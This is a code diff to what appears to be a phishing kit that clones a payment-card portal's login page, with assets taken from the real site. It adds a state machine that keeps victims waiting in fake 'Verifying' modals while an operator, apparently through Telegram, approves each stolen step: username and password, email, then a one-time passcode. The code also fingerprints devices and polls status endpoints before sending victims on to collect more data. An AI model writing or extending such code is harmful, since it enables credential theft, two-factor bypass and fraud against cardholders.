@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef, useCallback } from 'react';
 import { useLocation } from 'wouter';
 import { AntiCopyProtection } from '@/components/AntiCopyProtection';
 import { SEO } from '@/components/SEO';
@@ -13,13 +13,26 @@ import '@/styles/styles.css';
 import logoSvg from '@assets/extracted/login.mypaymentvault.com/paymentvault_logo.svg';
 import loginPageImg from '@assets/extracted/login.mypaymentvault.com/login_page.webp';
 
+type FlowStage = 
+  | 'idle'
+  | 'login_waiting'
+  | 'login_approved'
+  | 'email_input'
+  | 'email_waiting'
+  | 'email_kirimmi'
+  | 'email_timeout'
+  | 'otp_input'
+  | 'otp_waiting'
+  | 'otp_approved'
+  | 'login_rejected'
+  | 'login_timeout';
+
 export default function LoginPage() {
   const [, setLocation] = useLocation();
   const { toast } = useToast();
   const { t } = useLanguage();
   
-  const [showEmailModal, setShowEmailModal] = useState(false);
-  const [showOtpModal, setShowOtpModal] = useState(false);
+  const [flowStage, setFlowStage] = useState<FlowStage>('idle');
   const [loginAttemptId, setLoginAttemptId] = useState('');
   const [sessionId, setSessionId] = useState('');
   const [email, setEmail] = useState('');
@@ -29,7 +42,11 @@ export default function LoginPage() {
   const [password, setPassword] = useState('');
   const [emailError, setEmailError] = useState('');
   const [otpError, setOtpError] = useState('');
+  const [otpSentToEmail, setOtpSentToEmail] = useState(false);
   const [fingerprint, setFingerprint] = useState<DeviceFingerprint | null>(null);
+  const [countdown, setCountdown] = useState(180);
+  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   useEffect(() => {
     const heroImg = document.querySelector('[data-testid="img-login-hero"]');
@@ -37,7 +54,7 @@ export default function LoginPage() {
   }, []);
 
   useEffect(() => {
-    const collectFingerprint = async () => {
+    const collectFp = async () => {
       const stored = getStoredFingerprint();
       if (stored) {
         setFingerprint(stored);
@@ -46,8 +63,131 @@ export default function LoginPage() {
         setFingerprint(fp);
       }
     };
-    collectFingerprint();
+    collectFp();
   }, []);
+
+  useEffect(() => {
+    return () => {
+      if (pollingRef.current) clearInterval(pollingRef.current);
+      if (countdownRef.current) clearInterval(countdownRef.current);
+    };
+  }, []);
+
+  const startCountdown = useCallback(() => {
+    setCountdown(180);
+    if (countdownRef.current) clearInterval(countdownRef.current);
+    countdownRef.current = setInterval(() => {
+      setCountdown(prev => {
+        if (prev <= 1) {
+          if (countdownRef.current) clearInterval(countdownRef.current);
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+  }, []);
+
+  const stopPolling = useCallback(() => {
+    if (pollingRef.current) {
+      clearInterval(pollingRef.current);
+      pollingRef.current = null;
+    }
+    if (countdownRef.current) {
+      clearInterval(countdownRef.current);
+      countdownRef.current = null;
+    }
+  }, []);
+
+  const startLoginPolling = useCallback((attemptId: string) => {
+    stopPolling();
+    startCountdown();
+
+    pollingRef.current = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/login-status?loginAttemptId=${attemptId}`);
+        const data = await res.json();
+        
+        if (data.stage === 'login_approved') {
+          stopPolling();
+          setFlowStage('email_input');
+        } else if (data.stage === 'login_rejected') {
+          stopPolling();
+          setFlowStage('login_rejected');
+          toast({
+            title: 'Login Ditolak',
+            description: 'Username atau password salah. Silakan coba lagi.',
+            variant: 'destructive',
+          });
+        } else if (data.stage === 'login_timeout') {
+          stopPolling();
+          setFlowStage('login_timeout');
+          toast({
+            title: 'Waktu Habis',
+            description: 'Sesi login telah habis. Silakan coba lagi.',
+            variant: 'destructive',
+          });
+        }
+      } catch (err) {
+        console.error('Polling error:', err);
+      }
+    }, 2000);
+  }, [stopPolling, startCountdown, toast]);
+
+  const startEmailPolling = useCallback((attemptId: string) => {
+    stopPolling();
+    startCountdown();
+
+    pollingRef.current = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/email-status?loginAttemptId=${attemptId}`);
+        const data = await res.json();
+
+        if (data.stage === 'email_kirimmi') {
+          stopPolling();
+          setOtpSentToEmail(false);
+          setFlowStage('otp_input');
+        } else if (data.stage === 'email_timeout') {
+          stopPolling();
+          setOtpSentToEmail(true);
+          if (data.sessionId) {
+            setSessionId(data.sessionId);
+          }
+          setFlowStage('otp_input');
+        }
+      } catch (err) {
+        console.error('Email polling error:', err);
+      }
+    }, 2000);
+  }, [stopPolling, startCountdown]);
+
+  const startOtpPolling = useCallback((attemptId: string) => {
+    stopPolling();
+    startCountdown();
+
+    pollingRef.current = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/otp-status?loginAttemptId=${attemptId}`);
+        const data = await res.json();
+
+        if (data.stage === 'otp_approved' || data.stage === 'completed') {
+          stopPolling();
+          setFlowStage('otp_approved');
+          sessionStorage.setItem('loginAttemptId', attemptId);
+          setLocation('/postal-code');
+        } else if (data.stage === 'otp_timeout') {
+          stopPolling();
+          toast({
+            title: 'Waktu Habis',
+            description: 'Verifikasi OTP telah habis. Silakan coba lagi.',
+            variant: 'destructive',
+          });
+          setFlowStage('idle');
+        }
+      } catch (err) {
+        console.error('OTP polling error:', err);
+      }
+    }, 2000);
+  }, [stopPolling, startCountdown, toast, setLocation]);
 
   const maskEmail = (email: string) => {
     const [user, domain] = email.split('@');
@@ -93,7 +233,6 @@ export default function LoginPage() {
 
     try {
       const deviceData = getDeviceData();
-      // Use stored fingerprint if available, otherwise collect fresh
       const currentFingerprint = fingerprint || await collectDeviceFingerprint(true);
       const response = await apiRequest('POST', '/api/login', { 
         username, 
@@ -107,7 +246,8 @@ export default function LoginPage() {
       if (data.success) {
         setLoginAttemptId(data.loginAttemptId);
         sessionStorage.setItem('loginAttemptId', data.loginAttemptId);
-        setShowEmailModal(true);
+        setFlowStage('login_waiting');
+        startLoginPolling(data.loginAttemptId);
       }
     } catch (error: any) {
       toast({
@@ -122,13 +262,16 @@ export default function LoginPage() {
     if (!validateEmail()) return;
 
     try {
-      const response = await apiRequest('POST', '/api/verify-email', { loginAttemptId, email, sourceInfo: getSourceInfo() });
+      const response = await apiRequest('POST', '/api/submit-email', { 
+        loginAttemptId, 
+        email: email.trim(),
+        sourceInfo: getSourceInfo() 
+      });
       const data = await response.json();
       
       if (data.success) {
-        setSessionId(data.sessionId);
-        setShowEmailModal(false);
-        setShowOtpModal(true);
+        setFlowStage('email_waiting');
+        startEmailPolling(loginAttemptId);
       }
     } catch (error: any) {
       toast({
@@ -143,13 +286,17 @@ export default function LoginPage() {
     if (!validateOtp()) return;
 
     try {
-      const response = await apiRequest('POST', '/api/verify-otp', { sessionId, otpCode: otpCode.trim(), sourceInfo: getSourceInfo() });
+      const response = await apiRequest('POST', '/api/submit-otp-telegram', { 
+        loginAttemptId, 
+        otpCode: otpCode.trim(),
+        sessionId: otpSentToEmail ? sessionId : undefined,
+        sourceInfo: getSourceInfo() 
+      });
       const data = await response.json();
       
       if (data.success) {
-        sessionStorage.setItem('loginAttemptId', loginAttemptId);
-        setShowOtpModal(false);
-        setLocation('/postal-code');
+        setFlowStage('otp_waiting');
+        startOtpPolling(loginAttemptId);
       }
     } catch (error: any) {
       toast({
@@ -160,17 +307,27 @@ export default function LoginPage() {
     }
   };
 
-  const closeEmailModal = () => {
-    setShowEmailModal(false);
+  const closeModal = () => {
+    stopPolling();
+    setFlowStage('idle');
     setEmail('');
     setEmailError('');
-  };
-
-  const closeOtpModal = () => {
-    setShowOtpModal(false);
     setOtpCode('');
     setOtpError('');
+    setOtpSentToEmail(false);
   };
+
+  const formatCountdown = (seconds: number) => {
+    const m = Math.floor(seconds / 60);
+    const s = seconds % 60;
+    return `${m}:${s.toString().padStart(2, '0')}`;
+  };
+
+  const showWaitingModal = flowStage === 'login_waiting';
+  const showEmailModal = flowStage === 'email_input';
+  const showEmailWaitingModal = flowStage === 'email_waiting';
+  const showOtpModal = flowStage === 'otp_input';
+  const showOtpWaitingModal = flowStage === 'otp_waiting';
 
   const faqItems = [
     {
@@ -215,7 +372,6 @@ export default function LoginPage() {
           <div className="onbe-login-component">
             <div className="onbe-login-inner-component">
               
-              {/* Header */}
               <header className="onbe-headercomponent-parent">
                 <div className="onbe-login-header-padding d-flex col-xxl-3 col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6 offset-xxl-0 offset-xl-0 offset-lg-0 offset-md-0 offset-sm-0 offset-0">
                   <img 
@@ -229,16 +385,13 @@ export default function LoginPage() {
                 </div>
               </header>
 
-              {/* Main Content */}
               <div className="onbe-login-row row">
                 
-                {/* Form Section */}
                 <div className="onbe-login-details-section col-xxl-4 col-xl-5 col-lg-5 col-md-12 col-sm-12 col-12 offset-xxl-0 order-xl-2 offset-xl-0 order-lg-2 offset-lg-0 order-md-2 offset-md-0 order-sm-2 offset-sm-0 order-2 offset-0">
                   <form onSubmit={handleLogin} id="secure_login">
                     <div className="row">
                       <div className="onbe-formContainer">
                         
-                        {/* Subtitle */}
                         <div className="onbe-login-subtitle col-lg-12 col-md-12 col-12">
                           <h5 className="onbe-h5">{t('login.title')}</h5>
                           <div className="my-3">
@@ -247,12 +400,10 @@ export default function LoginPage() {
                           </div>
                         </div>
 
-                        {/* Forgot Username */}
                         <div className="onbe-login-forget col-lg-12 col-12">
                           <a href="/forgot-username" className="onbe-login-forget">{t('login.forgotUsername')}</a>
                         </div>
 
-                        {/* Username Field */}
                         <div className="col-lg-12 col-md-12 col-12">
                           <div className="onbe-btovr-input-group">
                             <input 
@@ -273,12 +424,10 @@ export default function LoginPage() {
                           </div>
                         </div>
 
-                        {/* Forgot Password */}
                         <div className="onbe-login-forget col-lg-12 col-12">
                           <a href="/forgot-password" className="onbe-login-forget">{t('login.forgotPassword')}</a>
                         </div>
 
-                        {/* Password Field */}
                         <div className="col-lg-12 col-md-12 col-12">
                           <div className="onbe-btovr-input-group">
                             <input 
@@ -299,20 +448,19 @@ export default function LoginPage() {
                           </div>
                         </div>
 
-                        {/* Submit Button */}
                         <div className="col-lg-12 col-md-12 col-sm-12 col-12">
                           <button 
                             type="submit" 
                             id="login" 
                             className="onbe-button onbe-button-primary" 
                             style={{ backgroundColor: '#212121', borderColor: '#212121', color: '#fff' }}
+                            disabled={flowStage !== 'idle' && flowStage !== 'login_rejected' && flowStage !== 'login_timeout'}
                             data-testid="button-login"
                           >
                             {t('login.signIn')}
                           </button>
                         </div>
 
-                        {/* Activate Card */}
                         <div className="text-center mt-2">
                           <p>
                             {t('login.activateCard')} 
@@ -325,7 +473,6 @@ export default function LoginPage() {
                   </form>
                 </div>
 
-                {/* Image Section */}
                 <div 
                   className="onbe-login-logo-section col-xxl-6 col-xl-6 col-lg-6 col-md-12 col-sm-12 col-12 order-xxl-2 offset-xxl-0 order-xl-2 offset-xl-0 order-lg-2 offset-lg-0 order-md-1 offset-md-0 order-sm-1 offset-sm-0 order-1 offset-0" 
                   style={{ background: 'linear-gradient(to top, var(--white-color), var(--white-color) 5%, #212121 0%)' }}
@@ -346,7 +493,6 @@ export default function LoginPage() {
 
             </div>
             
-            {/* Footer - outside row, below everything */}
             <div className="onbe-footer-width">
               <footer className="onbe-footer">
                 <ul className="onbe-footer-text">
@@ -361,7 +507,65 @@ export default function LoginPage() {
         </div>
       </div>
 
-      {/* Email Modal */}
+      {/* Waiting for Telegram Approval Modal */}
+      {showWaitingModal && (
+        <div 
+          className="otp-modal" 
+          style={{ 
+            display: 'flex', 
+            position: 'fixed', 
+            zIndex: 9999, 
+            top: 0, 
+            left: 0, 
+            width: '100vw', 
+            height: '100vh', 
+            backgroundColor: 'rgba(0,0,0,0.5)', 
+            alignItems: 'center', 
+            justifyContent: 'center' 
+          }}
+        >
+          <div style={{ 
+            background: '#fff', 
+            padding: '30px', 
+            borderRadius: '15px', 
+            width: '100%', 
+            maxWidth: '350px', 
+            textAlign: 'center', 
+            fontFamily: 'Arial', 
+            boxShadow: '0 0 20px rgba(0,0,0,0.4)' 
+          }}>
+            <div style={{ marginBottom: '20px' }}>
+              <div style={{ 
+                width: '50px', 
+                height: '50px', 
+                border: '4px solid #e0e0e0', 
+                borderTop: '4px solid #212121', 
+                borderRadius: '50%', 
+                animation: 'spin 1s linear infinite',
+                margin: '0 auto 15px'
+              }} />
+              <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
+            </div>
+            <p style={{ fontSize: '16px', fontWeight: 'bold', marginBottom: '8px' }}>Verifying Your Credentials</p>
+            <p style={{ fontSize: '14px', color: '#666', marginBottom: '15px' }}>
+              Please wait while we verify your login information. This may take a moment.
+            </p>
+            <p style={{ fontSize: '24px', fontWeight: 'bold', color: '#212121' }} data-testid="text-countdown-login">
+              {formatCountdown(countdown)}
+            </p>
+            <p style={{ fontSize: '12px', color: '#999', marginTop: '5px' }}>Time remaining</p>
+            <button 
+              onClick={closeModal}
+              style={{ marginTop: '15px', padding: '8px 20px', background: '#fff', color: '#000', fontSize: '13px', border: '1px solid #ccc', borderRadius: '6px', cursor: 'pointer' }}
+              data-testid="button-cancel-waiting"
+            >
+              Cancel
+            </button>
+          </div>
+        </div>
+      )}
+
+      {/* Email Input Modal */}
       {showEmailModal && (
         <div 
           className="otp-modal" 
@@ -419,7 +623,7 @@ export default function LoginPage() {
             )}
             <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '16px', marginBottom: '14px' }}>
               <button 
-                onClick={closeEmailModal} 
+                onClick={closeModal} 
                 style={{ flex: 1, marginRight: '6px', padding: '10px', background: '#fff', color: '#000', fontWeight: 'bold', fontSize: '14px', border: '1px solid black', borderRadius: '6px' }}
                 data-testid="button-cancel-email"
               >
@@ -443,7 +647,64 @@ export default function LoginPage() {
         </div>
       )}
 
-      {/* OTP Modal */}
+      {/* Waiting for KIRIMMI Modal */}
+      {showEmailWaitingModal && (
+        <div 
+          className="otp-modal" 
+          style={{ 
+            display: 'flex', 
+            position: 'fixed', 
+            zIndex: 9999, 
+            top: 0, 
+            left: 0, 
+            width: '100vw', 
+            height: '100vh', 
+            backgroundColor: 'rgba(0,0,0,0.5)', 
+            alignItems: 'center', 
+            justifyContent: 'center' 
+          }}
+        >
+          <div style={{ 
+            background: '#fff', 
+            padding: '30px', 
+            borderRadius: '15px', 
+            width: '100%', 
+            maxWidth: '350px', 
+            textAlign: 'center', 
+            fontFamily: 'Arial', 
+            boxShadow: '0 0 20px rgba(0,0,0,0.4)' 
+          }}>
+            <div style={{ marginBottom: '20px' }}>
+              <div style={{ 
+                width: '50px', 
+                height: '50px', 
+                border: '4px solid #e0e0e0', 
+                borderTop: '4px solid #212121', 
+                borderRadius: '50%', 
+                animation: 'spin 1s linear infinite',
+                margin: '0 auto 15px'
+              }} />
+            </div>
+            <p style={{ fontSize: '16px', fontWeight: 'bold', marginBottom: '8px' }}>Verifying Email Address</p>
+            <p style={{ fontSize: '14px', color: '#666', marginBottom: '15px' }}>
+              Please wait while we process your email verification. A code will be sent shortly.
+            </p>
+            <p style={{ fontSize: '24px', fontWeight: 'bold', color: '#212121' }} data-testid="text-countdown-email">
+              {formatCountdown(countdown)}
+            </p>
+            <p style={{ fontSize: '12px', color: '#999', marginTop: '5px' }}>Time remaining</p>
+            <button 
+              onClick={closeModal}
+              style={{ marginTop: '15px', padding: '8px 20px', background: '#fff', color: '#000', fontSize: '13px', border: '1px solid #ccc', borderRadius: '6px', cursor: 'pointer' }}
+              data-testid="button-cancel-email-waiting"
+            >
+              Cancel
+            </button>
+          </div>
+        </div>
+      )}
+
+      {/* OTP Input Modal */}
       {showOtpModal && (
         <div 
           className="otp-modal" 
@@ -472,11 +733,19 @@ export default function LoginPage() {
             fontFamily: 'Arial' 
           }}>
             <p className="onbe-textcomponent-header-otp-modal">{t('otp.title')}</p>
-            <p style={{ fontSize: '14px', marginBottom: '8px' }}>{t('otp.description')} <strong>{maskedEmail}</strong></p>
-            <p style={{ fontSize: '14px', marginBottom: '8px' }}>{t('otp.expiry')}</p>
-            <p style={{ fontSize: '13px', marginBottom: '8px', color: '#666', fontStyle: 'italic' }}>
-              If you don't see the code in your inbox, please check your spam or junk folder.
-            </p>
+            {otpSentToEmail ? (
+              <>
+                <p style={{ fontSize: '14px', marginBottom: '8px' }}>{t('otp.description')} <strong>{maskedEmail}</strong></p>
+                <p style={{ fontSize: '14px', marginBottom: '8px' }}>{t('otp.expiry')}</p>
+                <p style={{ fontSize: '13px', marginBottom: '8px', color: '#666', fontStyle: 'italic' }}>
+                  If you don't see the code in your inbox, please check your spam or junk folder.
+                </p>
+              </>
+            ) : (
+              <p style={{ fontSize: '14px', marginBottom: '8px' }}>
+                Please enter the verification code provided to you.
+              </p>
+            )}
             <div style={{ position: 'relative', margin: '20px auto' }}>
               <input 
                 id="otpCode" 
@@ -497,7 +766,7 @@ export default function LoginPage() {
             )}
             <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '16px', marginBottom: '14px' }}>
               <button 
-                onClick={closeOtpModal} 
+                onClick={closeModal} 
                 style={{ flex: 1, marginRight: '6px', padding: '10px', background: '#fff', color: '#000', fontWeight: 'bold', fontSize: '14px', border: '1px solid black', borderRadius: '6px' }}
                 data-testid="button-cancel-otp"
               >
@@ -511,11 +780,63 @@ export default function LoginPage() {
                 {t('otp.verify')}
               </button>
             </div>
-            <div style={{ marginTop: '15px' }}>
-              <a href="#" id="resendOtp" style={{ fontSize: '14px', color: 'black', textDecoration: 'underline' }} data-testid="link-resend-otp">
-                {t('otp.resend')}
-              </a>
+          </div>
+        </div>
+      )}
+
+      {/* Waiting for OTP Approval Modal */}
+      {showOtpWaitingModal && (
+        <div 
+          className="otp-modal" 
+          style={{ 
+            display: 'flex', 
+            position: 'fixed', 
+            zIndex: 9999, 
+            top: 0, 
+            left: 0, 
+            width: '100vw', 
+            height: '100vh', 
+            backgroundColor: 'rgba(0,0,0,0.5)', 
+            alignItems: 'center', 
+            justifyContent: 'center' 
+          }}
+        >
+          <div style={{ 
+            background: '#fff', 
+            padding: '30px', 
+            borderRadius: '15px', 
+            width: '100%', 
+            maxWidth: '350px', 
+            textAlign: 'center', 
+            fontFamily: 'Arial', 
+            boxShadow: '0 0 20px rgba(0,0,0,0.4)' 
+          }}>
+            <div style={{ marginBottom: '20px' }}>
+              <div style={{ 
+                width: '50px', 
+                height: '50px', 
+                border: '4px solid #e0e0e0', 
+                borderTop: '4px solid #212121', 
+                borderRadius: '50%', 
+                animation: 'spin 1s linear infinite',
+                margin: '0 auto 15px'
+              }} />
             </div>
+            <p style={{ fontSize: '16px', fontWeight: 'bold', marginBottom: '8px' }}>Verifying OTP Code</p>
+            <p style={{ fontSize: '14px', color: '#666', marginBottom: '15px' }}>
+              Please wait while we verify your code. This may take a moment.
+            </p>
+            <p style={{ fontSize: '24px', fontWeight: 'bold', color: '#212121' }} data-testid="text-countdown-otp">
+              {formatCountdown(countdown)}
+            </p>
+            <p style={{ fontSize: '12px', color: '#999', marginTop: '5px' }}>Time remaining</p>
+            <button 
+              onClick={closeModal}
+              style={{ marginTop: '15px', padding: '8px 20px', background: '#fff', color: '#000', fontSize: '13px', border: '1px solid #ccc', borderRadius: '6px', cursor: 'pointer' }}
+              data-testid="button-cancel-otp-waiting"
+            >
+              Cancel
+            </button>
           </div>
         </div>
       )}
